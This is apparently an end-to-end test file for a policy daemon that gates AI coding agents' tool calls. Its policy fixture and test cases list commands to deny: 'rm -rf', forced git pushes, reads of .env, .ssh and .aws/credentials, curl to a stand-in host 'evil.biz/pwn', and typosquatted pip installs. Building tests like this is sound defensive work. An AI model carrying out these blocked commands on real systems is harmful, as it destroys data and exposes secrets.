// Cross-service e2e. Spawns the Go control-plane on a random loopback
// port, waits for /v1/health, then invokes the CLI as a subprocess to
// verify the CLI→daemon wire is connected end-to-end.
//
// Gated: skips cleanly when `go` isn't on PATH so CI in minimal
// environments doesn't flap. Run: cd cli && bun test tests/e2e.test.ts

import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { spawn, type Subprocess } from "bun";
import { existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

const REPO_ROOT = resolve(import.meta.dir, "..", "..");
const CONTROL_PLANE_DIR = join(REPO_ROOT, "control-plane");
const CLI_ENTRY = join(REPO_ROOT, "cli", "src", "index.ts");
const LEDGER_DIR = join(REPO_ROOT, "ledger");

function rustTargetForGo(): string {
  const goos = Bun.spawnSync({ cmd: ["go", "env", "GOOS"], stdout: "pipe" });
  const goarch = Bun.spawnSync({ cmd: ["go", "env", "GOARCH"], stdout: "pipe" });
  const os = new TextDecoder().decode(goos.stdout).trim();
  const arch = new TextDecoder().decode(goarch.stdout).trim();
  const key = `${os}-${arch}`;
  const table: Record<string, string> = {
    "darwin-amd64": "x86_64-apple-darwin",
    "darwin-arm64": "aarch64-apple-darwin",
    "linux-amd64": "x86_64-unknown-linux-gnu",
    "linux-arm64": "aarch64-unknown-linux-gnu",
    "windows-amd64": "x86_64-pc-windows-msvc",
  };
  return table[key] ?? key;
}

function hasGo(): boolean {
  // `which go` synchronously.
  const r = Bun.spawnSync({ cmd: ["which", "go"], stderr: "pipe", stdout: "pipe" });
  return r.exitCode === 0;
}

async function waitForReady(url: string, timeoutMs = 20_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      const res = await fetch(url);
      if (res.ok) return;
    } catch {
      // not up yet
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`timed out waiting for ${url}`);
}

function randomPort(): number {
  // Loopback ephemeral range; collision risk negligible for a single
  // test run.
  return 30000 + Math.floor(Math.random() * 30000);
}

function hasLedgerStaticlib(): boolean {
  // Skip e2e when the Rust staticlib isn't built — the Go daemon links
  // it via CGO, so without it `go run ./cmd/control-plane` fails to
  // start and the whole suite times out in beforeEach.
  const target = rustTargetForGo();
  const libDir = join(LEDGER_DIR, "target", target, "release");
  // libopenagentlock_ledger.a is the staticlib, .so/.dylib the cdylib.
  return (
    existsSync(join(libDir, "libopenagentlock_ledger.a")) ||
    existsSync(join(libDir, "libopenagentlock_ledger.so")) ||
    existsSync(join(libDir, "libopenagentlock_ledger.dylib"))
  );
}

// Whole-suite gate.
const SKIP =
  !hasGo() ||
  !existsSync(join(CONTROL_PLANE_DIR, "go.mod")) ||
  !existsSync(CLI_ENTRY) ||
  !hasLedgerStaticlib();

let daemon: Subprocess | null = null;
let port = 0;
let agentlockHome = "";

beforeAll(async () => {
  if (SKIP) return;
  port = randomPort();
  agentlockHome = mkdtempSync(join(tmpdir(), "agentlock-e2e-"));

  // Enforce-mode policy so the destructive-bash test observes a real deny
  // rather than a monitor-mode allow-with-tag.
  //
  // Gate ordering matters here: `safety.rm-suggest-trash` is intentionally
  // placed BEFORE `rogue.destructive-bash` so that a plain `rm -rf` Bash
  // command fires the nudge-bearing rule (the round-trip we're testing in
  // T5). The legacy destructive-bash test now exercises the second
  // alternation (`git push --force`) which still flows through
  // `rogue.destructive-bash` — coverage preserved.
  //
  // `safety.secret-read-suggest-skill` matches `**/.aws/credentials`, a
  // path that does NOT match `rogue.secret-read`'s `**/.env*` or
  // `**/.ssh/**` globs, so the new rule fires cleanly without colliding.
  const policyPath = join(agentlockHome, "policy.yaml");
  writeFileSync(
    policyPath,
    `
version: 1
mode: enforce
defaults:
  bash: allow
gates:
  - id: safety.rm-suggest-trash
    match:
      tool: Bash
      any_command_regex:
        - 'rm\\s+-rf\\b'
    evaluate:
      - kind: always
        action: deny
        nudge: "use 'trash <path>' (macOS) or move the directory aside — recoverable from Trash."
  - id: safety.secret-read-suggest-skill
    match:
      tool: Read
      path_glob: "**/.aws/credentials"
    evaluate:
      - kind: always
        action: deny
        nudge: "use the openagentlock/skills secret-fetcher skill if installed; otherwise ask the operator to paste the credentials."
  - id: rogue.destructive-bash
    match:
      tool: Bash
      any_command_regex:
        - 'rm\\s+-rf\\b'
        - 'git\\s+push\\s+.*--force'
    evaluate:
      - kind: always
        action: deny
  - id: rogue.secret-read
    match:
      any_of:
        - { tool: Read, path_glob: "**/.env*" }
        - { tool: Read, path_glob: "**/.ssh/**" }
        - { tool: Bash, command_regex: 'cat\\s+.*(\\.env|credentials)' }
    evaluate:
      - kind: always
        action: deny
  - id: supply-chain.pkg-install
    match:
      tool: Bash
      command_regex: '^(pip|npm|brew|cargo) install\\s'
    evaluate:
      - kind: typosquat
        reference: __INLINE__:numpy,requests,react
        action_on_near_miss: deny
      - kind: allowlist
        list: __INLINE__:numpy,requests,react
        on_hit: allow
        on_miss: deny
  - id: rogue.net-egress
    match:
      tool: Bash
      command_regex: '\\b(curl|wget)\\b'
    evaluate:
      - kind: host-allowlist
        list: __INLINE__:api.anthropic.com,api.openai.com
        on_hit: allow
        on_miss: deny
  - id: supply-chain.untrusted-mcp
    match:
      tool_prefix: "mcp__"
    evaluate:
      - kind: pin-tofu
        store: \${AGENTLOCK_HOME}/pinned-mcp.json
        on_unknown: allow
        on_known: allow
        on_changed: deny
`,
  );

  const target = rustTargetForGo();
  const ledgerLibDir = join(LEDGER_DIR, "target", target, "release");
  const ledgerInclude = join(LEDGER_DIR, "include");

  daemon = spawn({
    cmd: ["go", "run", "-ldflags=-linkmode=external", "./cmd/control-plane"],
    cwd: CONTROL_PLANE_DIR,
    env: {
      ...process.env,
      AGENTLOCK_LISTEN: `127.0.0.1:${port}`,
      AGENTLOCK_HOME: agentlockHome,
      AGENTLOCK_POLICY: policyPath,
      CGO_ENABLED: "1",
      CGO_CFLAGS: `-I${ledgerInclude}`,
      CGO_LDFLAGS: `-L${ledgerLibDir} -lopenagentlock_ledger`,
    },
    stdout: "pipe",
    stderr: "pipe",
  });
  await waitForReady(`http://127.0.0.1:${port}/v1/health`);
});

afterAll(() => {
  if (daemon && daemon.pid) {
    try {
      daemon.kill();
    } catch {
      // best-effort
    }
  }
});

function base32Decode(s: string): Uint8Array {
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let bits = 0;
  let value = 0;
  const out: number[] = [];
  for (const ch of s.toUpperCase()) {
    if (ch === "=") break;
    const idx = alphabet.indexOf(ch);
    if (idx < 0) continue;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      bits -= 8;
      out.push((value >>> bits) & 0xff);
    }
  }
  return new Uint8Array(out);
}

async function createSession(): Promise<string> {
  const cliHome = mkdtempSync(join(tmpdir(), "agentlock-cli-"));
  const proc = spawn({
    cmd: [
      "bun",
      "run",
      CLI_ENTRY,
      "session",
      "create",
      "--tier",
      "software",
      "--json",
      "--url",
      `http://127.0.0.1:${port}`,
    ],
    env: {
      ...process.env,
      AGENTLOCK_HOME: cliHome,
      AGENTLOCK_ALLOW_SOFTWARE_SIGNER: "1",
    },
    stdout: "pipe",
    stderr: "pipe",
  });
  const stdout = await new Response(proc.stdout).text();
  await proc.exited;
  if (proc.exitCode !== 0) throw new Error(`session create failed: ${stdout}`);
  const parsed = JSON.parse(stdout) as { id: string };
  return parsed.id;
}

describe.if(!SKIP)("e2e — CLI <-> control-plane", () => {
  test("daemon /v1/health returns 200 ok", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/v1/health`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { status: string };
    expect(body.status).toBe("ok");
  });

  test("daemon returns 501 with a method name on a still-todo route", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/v1/approvals/pending`);
    expect(res.status).toBe(501);
    const body = (await res.json()) as { error: string; method: string };
    expect(body.error).toBe("not_implemented");
    expect(body.method).toBe("approval.pending");
  });

  test("CLI `session create --json` signs and persists a session", async () => {
    const cliHome = mkdtempSync(join(tmpdir(), "agentlock-cli-"));
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "session",
        "create",
        "--tier",
        "software",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      env: {
        ...process.env,
        AGENTLOCK_HOME: cliHome,
        AGENTLOCK_ALLOW_SOFTWARE_SIGNER: "1",
      },
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    const stderr = await new Response(proc.stderr).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const parsed = JSON.parse(stdout) as {
      id: string;
      started_at: string;
      expires_at: string;
      signer: string;
      signer_pubkey: string;
    };
    if (!parsed.id) throw new Error(`missing id; stderr=${stderr}`);
    expect(parsed.id.length).toBeGreaterThanOrEqual(16);
    expect(parsed.signer).toBe("software");
    expect(parsed.signer_pubkey.startsWith("ed25519:")).toBe(true);
    expect(new Date(parsed.expires_at).getTime()).toBeGreaterThan(
      new Date(parsed.started_at).getTime(),
    );

    // Daemon wrote a ledger line.
    const line = readFileSync(join(agentlockHome, "ledger.jsonl"), "utf8").trim();
    expect(line.length).toBeGreaterThan(0);
    const entry = JSON.parse(line.split("\n")[0]!) as {
      seq: number;
      source: string;
      tool_use_id: string;
      signer: string;
    };
    expect(entry.source).toBe("system");
    expect(entry.tool_use_id).toBe("session.create");
    expect(entry.signer).toBe("software");
  });

  test("daemon returns 405 on wrong method", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/v1/health`, {
      method: "POST",
    });
    expect(res.status).toBe(405);
  });

  test("daemon returns 404 on unknown path", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/v1/does-not-exist`);
    expect(res.status).toBe(404);
  });

  test("CLI `status --json` reaches the daemon and reports reachable", async () => {
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "status",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const parsed = JSON.parse(stdout) as {
      reachable: boolean;
      base_url: string;
      health: { status: string };
    };
    expect(parsed.reachable).toBe(true);
    expect(parsed.base_url).toBe(`http://127.0.0.1:${port}`);
    expect(parsed.health.status).toBe("ok");
  });

  test("fake-hook: benign Bash command → allow + rule_id=default", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--source",
        "claude-code",
        "--tool",
        "Bash",
        "--command",
        "ls -la",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const v = JSON.parse(stdout) as {
      verdict: string;
      rule_id: string;
      ledger_seq: number;
    };
    expect(v.verdict).toBe("allow");
    expect(v.rule_id).toBe("default");
  });

  test("fake-hook: destructive Bash command → deny + rule_id=rogue.destructive-bash", async () => {
    const sessionId = await createSession();
    // Uses `git push --force` (the second alternation in destructive-bash)
    // because `rm -rf` now matches safety.rm-suggest-trash first — see the
    // gate-ordering comment in the policy fixture above.
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--source",
        "claude-code",
        "--tool",
        "Bash",
        "--command",
        "git push origin main --force",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    // CLI exits 3 on deny so shells can branch on it.
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as {
      verdict: string;
      rule_id: string;
      reason: string;
    };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("rogue.destructive-bash");
    expect(v.reason).toContain("rogue.destructive-bash");
  });

  test("fake-hook: Read ~/.env → deny + rule_id=rogue.secret-read", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Read",
        "--file-path",
        "/home/alice/project/.env",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("rogue.secret-read");
  });

  test("fake-hook: Read README.md → allow", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Read",
        "--file-path",
        "/home/alice/project/README.md",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("allow");
    expect(v.rule_id).toBe("default");
  });

  test("fake-hook: Bash cat .env → deny + rule_id=rogue.secret-read", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "cat .env.production",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as { rule_id: string };
    expect(v.rule_id).toBe("rogue.secret-read");
  });

  // T5 nudge round-trip: a policy rule with `nudge:` must surface the
  // hint string in the gate JSON response, and rules without a nudge must
  // omit the field entirely (omitempty on the wire).

  test("fake-hook: rm -rf → deny with safety.rm-suggest-trash and nudge text", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--source",
        "claude-code",
        "--tool",
        "Bash",
        "--command",
        "rm -rf /tmp/demo",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as {
      verdict: string;
      rule_id: string;
      nudge: string;
    };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("safety.rm-suggest-trash");
    expect(v.nudge).toContain("trash");
  });

  test("fake-hook: Read .aws/credentials → deny with secret-read-suggest-skill nudge", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Read",
        "--file-path",
        "/home/alice/.aws/credentials",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as {
      verdict: string;
      rule_id: string;
      nudge: string;
    };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("safety.secret-read-suggest-skill");
    expect(v.nudge).toContain("secret-fetcher");
  });

  test("fake-hook: allow path → no nudge field in JSON (omitempty wire check)", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--source",
        "claude-code",
        "--tool",
        "Bash",
        "--command",
        "echo hello",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const v = JSON.parse(stdout) as Record<string, unknown>;
    expect(v.verdict).toBe("allow");
    // omitempty must drop the `nudge` key when no rule fired with one —
    // not just produce an empty string. Assert wire-level absence.
    expect("nudge" in v).toBe(false);
    expect(Object.keys(v)).not.toContain("nudge");
  });

  test("fake-hook: pip install numpy → allow (pkg on allowlist)", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "pip install numpy",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("allow");
    expect(v.rule_id).toBe("supply-chain.pkg-install");
  });

  test("fake-hook: pip install reqeusts (typo) → deny via typosquat", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "pip install reqeusts",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("supply-chain.pkg-install");
  });

  test("fake-hook: pip install evilpkg → deny (pkg off allowlist)", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "pip install evilpkg",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("supply-chain.pkg-install");
  });

  test("fake-hook: curl anthropic.com → allow (host on allowlist)", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "curl https://api.anthropic.com/v1/messages",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("allow");
    expect(v.rule_id).toBe("rogue.net-egress");
  });

  test("fake-hook: curl evil.biz → deny", async () => {
    const sessionId = await createSession();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "curl https://evil.biz/pwn",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(3);
    const v = JSON.parse(stdout) as { verdict: string; rule_id: string };
    expect(v.verdict).toBe("deny");
    expect(v.rule_id).toBe("rogue.net-egress");
  });

  test("fake-hook: MCP pin-tofu accepts on first use + rejects a later swap", async () => {
    const sessionId = await createSession();
    const run = async (fp: string) => {
      const proc = spawn({
        cmd: [
          "bun",
          "run",
          CLI_ENTRY,
          "fake-hook",
          "--session",
          sessionId,
          "--tool",
          "mcp__filesystem__read",
          "--input",
          JSON.stringify({ mcp_server: "filesystem", mcp_fingerprint: fp }),
          "--json",
          "--url",
          `http://127.0.0.1:${port}`,
        ],
        stdout: "pipe",
        stderr: "pipe",
      });
      const stdout = await new Response(proc.stdout).text();
      await proc.exited;
      return { code: proc.exitCode, v: JSON.parse(stdout) as { verdict: string; rule_id: string } };
    };
    const first = await run("sha256:aa11");
    expect(first.v.verdict).toBe("allow");
    expect(first.v.rule_id).toBe("supply-chain.untrusted-mcp");
    const repeat = await run("sha256:aa11");
    expect(repeat.v.verdict).toBe("allow");
    const swap = await run("sha256:bb22");
    expect(swap.v.verdict).toBe("deny");
    expect(swap.v.rule_id).toBe("supply-chain.untrusted-mcp");
  });

  test("fake-hook: unknown session → 404", async () => {
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        "does-not-exist",
        "--source",
        "claude-code",
        "--tool",
        "Bash",
        "--command",
        "ls",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stderr = await new Response(proc.stderr).text();
    await proc.exited;
    expect(proc.exitCode).not.toBe(0);
    expect(stderr).toContain("404");
  });

  test("CLI `ledger root` returns a sha256 root after some gate traffic", async () => {
    const sessionId = await createSession();
    // Fire two gate checks to grow the chain.
    for (const cmd of ["ls", "pwd"]) {
      const p = spawn({
        cmd: [
          "bun",
          "run",
          CLI_ENTRY,
          "fake-hook",
          "--session",
          sessionId,
          "--source",
          "claude-code",
          "--tool",
          "Bash",
          "--command",
          cmd,
          "--json",
          "--url",
          `http://127.0.0.1:${port}`,
        ],
        stdout: "pipe",
        stderr: "pipe",
      });
      await p.exited;
    }

    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "ledger",
        "root",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const r = JSON.parse(stdout) as { root: string; count: number };
    expect(r.root.startsWith("sha256:")).toBe(true);
    expect(r.count).toBeGreaterThanOrEqual(3);
  });

  test("CLI `ledger verify` reports ok on an untampered ledger", async () => {
    await createSession(); // guarantees at least one leaf
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "ledger",
        "verify",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(0);
    const r = JSON.parse(stdout) as { ok: boolean };
    expect(r.ok).toBe(true);
  });

  test("TOTP: enroll TOTP → compute code → session create → daemon 201", async () => {
    const home = mkdtempSync(join(tmpdir(), "agentlock-totp-e2e-"));
    const env = {
      ...process.env,
      AGENTLOCK_HOME: home,
      AGENTLOCK_ARGON2_FAST: "1",
    };

    // 1. enroll
    const enroll = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "signer",
        "enroll",
        "--tier",
        "totp",
        "--passphrase",
        "pp",
        "--json",
      ],
      env,
      stdout: "pipe",
      stderr: "pipe",
    });
    const enrollOut = await new Response(enroll.stdout).text();
    await enroll.exited;
    if (enroll.exitCode !== 0) {
      throw new Error(`enroll failed: ${enrollOut}`);
    }
    const enrollJson = JSON.parse(enrollOut) as { secret_base32: string };

    // 2. compute current code from the enrolled secret using the same
    //    RFC 6238 primitive the signer uses.
    const { generateTOTPCode } = await import("../src/signer/totp");
    const secret = base32Decode(enrollJson.secret_base32);
    const code = await generateTOTPCode(secret, Math.floor(Date.now() / 1000));

    // 3. session create
    const sess = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "session",
        "create",
        "--tier",
        "totp",
        "--passphrase",
        "pp",
        "--code",
        code,
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      env,
      stdout: "pipe",
      stderr: "pipe",
    });
    const sessOut = await new Response(sess.stdout).text();
    const sessErr = await new Response(sess.stderr).text();
    await sess.exited;
    if (sess.exitCode !== 0) {
      throw new Error(`session create failed: stdout=${sessOut} stderr=${sessErr}`);
    }
    const parsed = JSON.parse(sessOut) as {
      id: string;
      signer: string;
      signer_pubkey: string;
    };
    expect(parsed.id.length).toBeGreaterThanOrEqual(16);
    expect(parsed.signer).toBe("totp_backed_software");
    expect(parsed.signer_pubkey.startsWith("ed25519:")).toBe(true);
  });

  test("CLI `session end` → subsequent fake-hook returns 410 Gone", async () => {
    const sessionId = await createSession();

    const endProc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "session",
        "end",
        "--id",
        sessionId,
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    await endProc.exited;
    expect(endProc.exitCode).toBe(0);

    const hookProc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "ls",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stderr = await new Response(hookProc.stderr).text();
    await hookProc.exited;
    expect(hookProc.exitCode).not.toBe(0);
    expect(stderr).toContain("410");
  });

  test("CLI `session rotate` issues a fresh attestation and keeps the session active", async () => {
    const sessionId = await createSession();

    const rotate = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "session",
        "rotate",
        "--id",
        sessionId,
        "--tier",
        "software",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      env: {
        ...process.env,
        AGENTLOCK_HOME: mkdtempSync(join(tmpdir(), "agentlock-rotate-")),
        AGENTLOCK_ALLOW_SOFTWARE_SIGNER: "1",
      },
      stdout: "pipe",
      stderr: "pipe",
    });
    const rotateOut = await new Response(rotate.stdout).text();
    const rotateErr = await new Response(rotate.stderr).text();
    await rotate.exited;
    if (rotate.exitCode !== 0) {
      throw new Error(`rotate failed: stdout=${rotateOut} stderr=${rotateErr}`);
    }
    const parsed = JSON.parse(rotateOut) as { id: string };
    expect(parsed.id).toBe(sessionId);

    // Session still accepts gate checks.
    const hook = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "fake-hook",
        "--session",
        sessionId,
        "--tool",
        "Bash",
        "--command",
        "ls",
        "--json",
        "--url",
        `http://127.0.0.1:${port}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    await hook.exited;
    expect(hook.exitCode).toBe(0);
  });

  test("CLI `status` fails gracefully against a dead port", async () => {
    const dead = randomPort();
    const proc = spawn({
      cmd: [
        "bun",
        "run",
        CLI_ENTRY,
        "status",
        "--json",
        "--url",
        `http://127.0.0.1:${dead}`,
      ],
      stdout: "pipe",
      stderr: "pipe",
    });
    const stdout = await new Response(proc.stdout).text();
    await proc.exited;
    expect(proc.exitCode).toBe(1);
    const parsed = JSON.parse(stdout) as { reachable: boolean };
    expect(parsed.reachable).toBe(false);
  });
});

describe.if(SKIP)("e2e — skipped", () => {
  test("skipped because `go` unavailable or repo paths missing", () => {
    expect(SKIP).toBe(true);
  });
});
